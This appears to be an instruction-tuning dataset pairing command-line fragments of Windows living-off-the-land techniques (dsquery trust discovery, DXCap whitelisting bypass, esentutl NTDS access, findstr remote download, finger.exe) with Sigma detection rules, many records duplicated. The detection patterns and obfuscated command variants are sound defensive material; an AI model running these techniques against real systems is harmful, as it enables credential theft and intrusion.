{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsquery.exe trustedDomain dsquery.exe", "output": "title: Domain Trust Discovery Via Dsquery\nid: 3bad990e-4848-4a78-9530-b427d854aac0\nrelated:\n    - id: b23fcb74-b1cb-4ff7-a31d-bfe2a7ba453b\n      type: similar\n    - id: 77815820-246c-47b8-9741-e0def3f57308\n      type: obsolete\nstatus: test\ndescription: Detects execution of \"dsquery.exe\" for domain trust discovery\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1482/T1482.md\n    - https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb?gi=41b97a644843\nauthor: E.M. Anhaus, Tony Lambert, oscd.community, omkar72\ndate: 2019-10-24\nmodified: 2023-02-02\ntags:\n    - attack.discovery\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsquery.exe'\n        - OriginalFileName: 'dsquery.exe'\n    selection_cli:\n        CommandLine|contains: 'trustedDomain'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the utilities by legitimate user for legitimate reason\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DXCap.exe DXCap.exe -c", "output": "title: New Capture Session Launched Via DXCap.EXE\nid: 60f16a96-db70-42eb-8f76-16763e333590\nstatus: test\ndescription: |\n    Detects the execution of \"DXCap.EXE\" with the \"-c\" flag, which allows a user to launch any arbitrary binary or windows package through DXCap itself. This can be abused to potentially bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dxcap/\n    - https://twitter.com/harr0ey/status/992008180904419328\nauthor: Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-26\nmodified: 2022-06-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\DXCap.exe'\n        - OriginalFileName: 'DXCap.exe'\n    selection_cli:\n        CommandLine|contains: ' -c ' # The \".exe\" is not required to run the binary\n    condition: all of selection*\nfalsepositives:\n    - Legitimate execution of dxcap.exe by legitimate user\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DXCap.exe DXCap.exe \\\"-\\\"\\\"c\\\"", "output": "title: New Capture Session Launched Via DXCap.EXE\nid: 60f16a96-db70-42eb-8f76-16763e333590\nstatus: test\ndescription: |\n    Detects the execution of \"DXCap.EXE\" with the \"-c\" flag, which allows a user to launch any arbitrary binary or windows package through DXCap itself. This can be abused to potentially bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dxcap/\n    - https://twitter.com/harr0ey/status/992008180904419328\nauthor: Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-26\nmodified: 2022-06-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\DXCap.exe'\n        - OriginalFileName: 'DXCap.exe'\n    selection_cli:\n        CommandLine|contains: ' -c ' # The \".exe\" is not required to run the binary\n    condition: all of selection*\nfalsepositives:\n    - Legitimate execution of dxcap.exe by legitimate user\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DXCap DXCap -c", "output": "title: New Capture Session Launched Via DXCap.EXE\nid: 60f16a96-db70-42eb-8f76-16763e333590\nstatus: test\ndescription: |\n    Detects the execution of \"DXCap.EXE\" with the \"-c\" flag, which allows a user to launch any arbitrary binary or windows package through DXCap itself. This can be abused to potentially bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dxcap/\n    - https://twitter.com/harr0ey/status/992008180904419328\nauthor: Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-26\nmodified: 2022-06-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\DXCap.exe'\n        - OriginalFileName: 'DXCap.exe'\n    selection_cli:\n        CommandLine|contains: ' -c ' # The \".exe\" is not required to run the binary\n    condition: all of selection*\nfalsepositives:\n    - Legitimate execution of dxcap.exe by legitimate user\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DXCap.exe -c DXCap.exe", "output": "title: New Capture Session Launched Via DXCap.EXE\nid: 60f16a96-db70-42eb-8f76-16763e333590\nstatus: test\ndescription: |\n    Detects the execution of \"DXCap.EXE\" with the \"-c\" flag, which allows a user to launch any arbitrary binary or windows package through DXCap itself. This can be abused to potentially bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dxcap/\n    - https://twitter.com/harr0ey/status/992008180904419328\nauthor: Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-26\nmodified: 2022-06-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\DXCap.exe'\n        - OriginalFileName: 'DXCap.exe'\n    selection_cli:\n        CommandLine|contains: ' -c ' # The \".exe\" is not required to run the binary\n    condition: all of selection*\nfalsepositives:\n    - Legitimate execution of dxcap.exe by legitimate user\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "esentutl /p", "output": "title: Esentutl Gather Credentials\nid: 7df1713a-1a5b-4a4b-a071-dc83b144a101\nstatus: test\ndescription: Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.\nreferences:\n    - https://twitter.com/vxunderground/status/1423336151860002816\n    - https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/\nauthor: sam0x90\ndate: 2021-08-06\nmodified: 2022-10-09\ntags:\n    - attack.credential-access\n    - attack.t1003\n    - attack.t1003.003\n    - attack.s0404\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'esentutl'\n            - ' /p'\n    condition: selection\nfields:\n    - User\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - To be determined\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "esentutl /\"p\"", "output": "title: Esentutl Gather Credentials\nid: 7df1713a-1a5b-4a4b-a071-dc83b144a101\nstatus: test\ndescription: Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.\nreferences:\n    - https://twitter.com/vxunderground/status/1423336151860002816\n    - https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/\nauthor: sam0x90\ndate: 2021-08-06\nmodified: 2022-10-09\ntags:\n    - attack.credential-access\n    - attack.t1003\n    - attack.t1003.003\n    - attack.s0404\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'esentutl'\n            - ' /p'\n    condition: selection\nfields:\n    - User\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - To be determined\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "esentutl /p", "output": "title: Esentutl Gather Credentials\nid: 7df1713a-1a5b-4a4b-a071-dc83b144a101\nstatus: test\ndescription: Conti recommendation to its affiliates to use esentutl to access NTDS dumped file. Trickbot also uses this utilities to get MSEdge info via its module pwgrab.\nreferences:\n    - https://twitter.com/vxunderground/status/1423336151860002816\n    - https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/\nauthor: sam0x90\ndate: 2021-08-06\nmodified: 2022-10-09\ntags:\n    - attack.credential-access\n    - attack.t1003\n    - attack.t1003.003\n    - attack.s0404\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'esentutl'\n            - ' /p'\n    condition: selection\nfields:\n    - User\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - To be determined\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\powershell.exe \\pwsh.exe \\explorer.exe shell:mycomputerfolder", "output": "title: File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell\nid: c3d76afc-93df-461e-8e67-9b2bad3f2ac4\nstatus: experimental\ndescription: |\n    Detects the initial execution of \"cmd.exe\" which spawns \"explorer.exe\" with the appropriate command line arguments for opening the \"My Computer\" folder.\nauthor: '@Kostastsale'\nreferences:\n    - https://ss64.com/nt/shell.html\ndate: 2022-12-22\nmodified: 2024-08-23\ntags:\n    - attack.discovery\n    - attack.t1135\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith: '\\explorer.exe'\n        CommandLine|contains: 'shell:mycomputerfolder'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\powershell.exe \\pwsh.exe \\\"\\explorer.exe\\\" \\\"shell:mycomputerfolder\\\"", "output": "title: File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell\nid: c3d76afc-93df-461e-8e67-9b2bad3f2ac4\nstatus: experimental\ndescription: |\n    Detects the initial execution of \"cmd.exe\" which spawns \"explorer.exe\" with the appropriate command line arguments for opening the \"My Computer\" folder.\nauthor: '@Kostastsale'\nreferences:\n    - https://ss64.com/nt/shell.html\ndate: 2022-12-22\nmodified: 2024-08-23\ntags:\n    - attack.discovery\n    - attack.t1135\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith: '\\explorer.exe'\n        CommandLine|contains: 'shell:mycomputerfolder'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd \\powershell \\pwsh \\explorer shell:mycomputerfolder", "output": "title: File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell\nid: c3d76afc-93df-461e-8e67-9b2bad3f2ac4\nstatus: experimental\ndescription: |\n    Detects the initial execution of \"cmd.exe\" which spawns \"explorer.exe\" with the appropriate command line arguments for opening the \"My Computer\" folder.\nauthor: '@Kostastsale'\nreferences:\n    - https://ss64.com/nt/shell.html\ndate: 2022-12-22\nmodified: 2024-08-23\ntags:\n    - attack.discovery\n    - attack.t1135\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith: '\\explorer.exe'\n        CommandLine|contains: 'shell:mycomputerfolder'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\explorer.exe \\powershell.exe shell:mycomputerfolder \\pwsh.exe", "output": "title: File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell\nid: c3d76afc-93df-461e-8e67-9b2bad3f2ac4\nstatus: experimental\ndescription: |\n    Detects the initial execution of \"cmd.exe\" which spawns \"explorer.exe\" with the appropriate command line arguments for opening the \"My Computer\" folder.\nauthor: '@Kostastsale'\nreferences:\n    - https://ss64.com/nt/shell.html\ndate: 2022-12-22\nmodified: 2024-08-23\ntags:\n    - attack.discovery\n    - attack.t1135\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith: '\\explorer.exe'\n        CommandLine|contains: 'shell:mycomputerfolder'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "findstr findstr.exe FINDSTR.EXE -v -l \\\\\\\\", "output": "title: Remote File Download Via Findstr.EXE\nid: 587254ee-a24b-4335-b3cd-065c0f1f4baa\nrelated:\n    - id: bf6c39fc-e203-45b9-9538-05397c1b4f3f\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"findstr\" with specific flags and a remote share path. This specific set of CLI flags would allow \"findstr\" to download the content of the file located on the remote share as described in the LOLBAS entry.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Findstr/\n    - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.command-and-control\n    - attack.t1218\n    - attack.t1564.004\n    - attack.t1552.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_findstr:\n        - CommandLine|contains: findstr\n        - Image|endswith: 'findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_cli_download_1:\n        CommandLine|contains|windash: ' -v '\n    selection_cli_download_2:\n        CommandLine|contains|windash: ' -l '\n    selection_cli_download_3:\n        CommandLine|contains: '\\\\\\\\'\n    condition: selection_findstr and all of selection_cli_download_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "findstr findstr.exe FINDSTR.EXE -v \"-l\" \\\\\\\\", "output": "title: Remote File Download Via Findstr.EXE\nid: 587254ee-a24b-4335-b3cd-065c0f1f4baa\nrelated:\n    - id: bf6c39fc-e203-45b9-9538-05397c1b4f3f\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"findstr\" with specific flags and a remote share path. This specific set of CLI flags would allow \"findstr\" to download the content of the file located on the remote share as described in the LOLBAS entry.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Findstr/\n    - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.command-and-control\n    - attack.t1218\n    - attack.t1564.004\n    - attack.t1552.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_findstr:\n        - CommandLine|contains: findstr\n        - Image|endswith: 'findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_cli_download_1:\n        CommandLine|contains|windash: ' -v '\n    selection_cli_download_2:\n        CommandLine|contains|windash: ' -l '\n    selection_cli_download_3:\n        CommandLine|contains: '\\\\\\\\'\n    condition: selection_findstr and all of selection_cli_download_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "findstr findstr FINDSTR -v -l \\\\\\\\", "output": "title: Remote File Download Via Findstr.EXE\nid: 587254ee-a24b-4335-b3cd-065c0f1f4baa\nrelated:\n    - id: bf6c39fc-e203-45b9-9538-05397c1b4f3f\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"findstr\" with specific flags and a remote share path. This specific set of CLI flags would allow \"findstr\" to download the content of the file located on the remote share as described in the LOLBAS entry.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Findstr/\n    - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.command-and-control\n    - attack.t1218\n    - attack.t1564.004\n    - attack.t1552.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_findstr:\n        - CommandLine|contains: findstr\n        - Image|endswith: 'findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_cli_download_1:\n        CommandLine|contains|windash: ' -v '\n    selection_cli_download_2:\n        CommandLine|contains|windash: ' -l '\n    selection_cli_download_3:\n        CommandLine|contains: '\\\\\\\\'\n    condition: selection_findstr and all of selection_cli_download_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "findstr \\\\\\\\ -v findstr.exe -l FINDSTR.EXE", "output": "title: Remote File Download Via Findstr.EXE\nid: 587254ee-a24b-4335-b3cd-065c0f1f4baa\nrelated:\n    - id: bf6c39fc-e203-45b9-9538-05397c1b4f3f\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"findstr\" with specific flags and a remote share path. This specific set of CLI flags would allow \"findstr\" to download the content of the file located on the remote share as described in the LOLBAS entry.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Findstr/\n    - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.command-and-control\n    - attack.t1218\n    - attack.t1564.004\n    - attack.t1552.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_findstr:\n        - CommandLine|contains: findstr\n        - Image|endswith: 'findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_cli_download_1:\n        CommandLine|contains|windash: ' -v '\n    selection_cli_download_2:\n        CommandLine|contains|windash: ' -l '\n    selection_cli_download_3:\n        CommandLine|contains: '\\\\\\\\'\n    condition: selection_findstr and all of selection_cli_download_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "findstr findstr.exe FINDSTR.EXE -s -i", "output": "title: Insensitive Subfolder Search Via Findstr.EXE\nid: 04936b66-3915-43ad-a8e5-809eadfd1141\nrelated:\n    - id: bf6c39fc-e203-45b9-9538-05397c1b4f3f\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of findstr with the \"s\" and \"i\" flags for a \"subfolder\" and \"insensitive\" search respectively. Attackers sometimes leverage this built-in utility to search the system for interesting files or filter through results of commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Findstr/\n    - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.command-and-control\n    - attack.t1218\n    - attack.t1564.004\n    - attack.t1552.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_findstr:\n        - CommandLine|contains: findstr\n        - Image|endswith: 'findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_cli_search_subfolder:\n        CommandLine|contains|windash: ' -s '\n    selection_cli_search_insensitive:\n        CommandLine|contains|windash: ' -i '\n    condition: selection_findstr and all of selection_cli_search_*\nfalsepositives:\n    - Administrative or software activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "findstr findstr.exe FINDSTR.EXE \\\"-\\\"\\\"s\\\" -i", "output": "title: Insensitive Subfolder Search Via Findstr.EXE\nid: 04936b66-3915-43ad-a8e5-809eadfd1141\nrelated:\n    - id: bf6c39fc-e203-45b9-9538-05397c1b4f3f\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of findstr with the \"s\" and \"i\" flags for a \"subfolder\" and \"insensitive\" search respectively. Attackers sometimes leverage this built-in utility to search the system for interesting files or filter through results of commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Findstr/\n    - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.command-and-control\n    - attack.t1218\n    - attack.t1564.004\n    - attack.t1552.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_findstr:\n        - CommandLine|contains: findstr\n        - Image|endswith: 'findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_cli_search_subfolder:\n        CommandLine|contains|windash: ' -s '\n    selection_cli_search_insensitive:\n        CommandLine|contains|windash: ' -i '\n    condition: selection_findstr and all of selection_cli_search_*\nfalsepositives:\n    - Administrative or software activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "findstr findstr FINDSTR -s -i", "output": "title: Insensitive Subfolder Search Via Findstr.EXE\nid: 04936b66-3915-43ad-a8e5-809eadfd1141\nrelated:\n    - id: bf6c39fc-e203-45b9-9538-05397c1b4f3f\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of findstr with the \"s\" and \"i\" flags for a \"subfolder\" and \"insensitive\" search respectively. Attackers sometimes leverage this built-in utility to search the system for interesting files or filter through results of commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Findstr/\n    - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.command-and-control\n    - attack.t1218\n    - attack.t1564.004\n    - attack.t1552.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_findstr:\n        - CommandLine|contains: findstr\n        - Image|endswith: 'findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_cli_search_subfolder:\n        CommandLine|contains|windash: ' -s '\n    selection_cli_search_insensitive:\n        CommandLine|contains|windash: ' -i '\n    condition: selection_findstr and all of selection_cli_search_*\nfalsepositives:\n    - Administrative or software activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "findstr -s findstr.exe FINDSTR.EXE -i", "output": "title: Insensitive Subfolder Search Via Findstr.EXE\nid: 04936b66-3915-43ad-a8e5-809eadfd1141\nrelated:\n    - id: bf6c39fc-e203-45b9-9538-05397c1b4f3f\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of findstr with the \"s\" and \"i\" flags for a \"subfolder\" and \"insensitive\" search respectively. Attackers sometimes leverage this built-in utility to search the system for interesting files or filter through results of commands.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Findstr/\n    - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\n    - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f\nauthor: Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.command-and-control\n    - attack.t1218\n    - attack.t1564.004\n    - attack.t1552.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_findstr:\n        - CommandLine|contains: findstr\n        - Image|endswith: 'findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_cli_search_subfolder:\n        CommandLine|contains|windash: ' -s '\n    selection_cli_search_insensitive:\n        CommandLine|contains|windash: ' -i '\n    condition: selection_findstr and all of selection_cli_search_*\nfalsepositives:\n    - Administrative or software activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "finger.exe \\finger.exe", "output": "title: Finger.EXE Execution\nid: af491bca-e752-4b44-9c86-df5680533dbc\nstatus: test\ndescription: |\n    Detects execution of the \"finger.exe\" utility.\n    Finger.EXE or \"TCPIP Finger Command\" is an old utility that is still present on modern Windows installation. It Displays information about users on a specified remote computer (typically a UNIX computer) that is running the finger service or daemon.\n    Due to the old nature of this utility and the rareness of machines having the finger service. Any execution of \"finger.exe\" can be considered \"suspicious\" and worth investigating.\nreferences:\n    - https://twitter.com/bigmacjpg/status/1349727699863011328?s=12\n    - https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/\n    - http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt\nauthor: Florian Roth (Nextron Systems), omkar72, oscd.community\ndate: 2021-02-24\nmodified: 2024-06-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'finger.exe'\n        - Image|endswith: '\\finger.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity (unclear what they do nowadays with finger.exe)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "finger.exe \"\\finger.exe\"", "output": "title: Finger.EXE Execution\nid: af491bca-e752-4b44-9c86-df5680533dbc\nstatus: test\ndescription: |\n    Detects execution of the \"finger.exe\" utility.\n    Finger.EXE or \"TCPIP Finger Command\" is an old utility that is still present on modern Windows installation. It Displays information about users on a specified remote computer (typically a UNIX computer) that is running the finger service or daemon.\n    Due to the old nature of this utility and the rareness of machines having the finger service. Any execution of \"finger.exe\" can be considered \"suspicious\" and worth investigating.\nreferences:\n    - https://twitter.com/bigmacjpg/status/1349727699863011328?s=12\n    - https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/\n    - http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt\nauthor: Florian Roth (Nextron Systems), omkar72, oscd.community\ndate: 2021-02-24\nmodified: 2024-06-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'finger.exe'\n        - Image|endswith: '\\finger.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity (unclear what they do nowadays with finger.exe)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "finger \\finger", "output": "title: Finger.EXE Execution\nid: af491bca-e752-4b44-9c86-df5680533dbc\nstatus: test\ndescription: |\n    Detects execution of the \"finger.exe\" utility.\n    Finger.EXE or \"TCPIP Finger Command\" is an old utility that is still present on modern Windows installation. It Displays information about users on a specified remote computer (typically a UNIX computer) that is running the finger service or daemon.\n    Due to the old nature of this utility and the rareness of machines having the finger service. Any execution of \"finger.exe\" can be considered \"suspicious\" and worth investigating.\nreferences:\n    - https://twitter.com/bigmacjpg/status/1349727699863011328?s=12\n    - https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/\n    - http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt\nauthor: Florian Roth (Nextron Systems), omkar72, oscd.community\ndate: 2021-02-24\nmodified: 2024-06-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'finger.exe'\n        - Image|endswith: '\\finger.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity (unclear what they do nowadays with finger.exe)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "finger.exe \\finger.exe", "output": "title: Finger.EXE Execution\nid: af491bca-e752-4b44-9c86-df5680533dbc\nstatus: test\ndescription: |\n    Detects execution of the \"finger.exe\" utility.\n    Finger.EXE or \"TCPIP Finger Command\" is an old utility that is still present on modern Windows installation. It Displays information about users on a specified remote computer (typically a UNIX computer) that is running the finger service or daemon.\n    Due to the old nature of this utility and the rareness of machines having the finger service. Any execution of \"finger.exe\" can be considered \"suspicious\" and worth investigating.\nreferences:\n    - https://twitter.com/bigmacjpg/status/1349727699863011328?s=12\n    - https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/\n    - http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt\nauthor: Florian Roth (Nextron Systems), omkar72, oscd.community\ndate: 2021-02-24\nmodified: 2024-06-27\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - OriginalFileName: 'finger.exe'\n        - Image|endswith: '\\finger.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity (unclear what they do nowadays with finger.exe)\nlevel: high"}
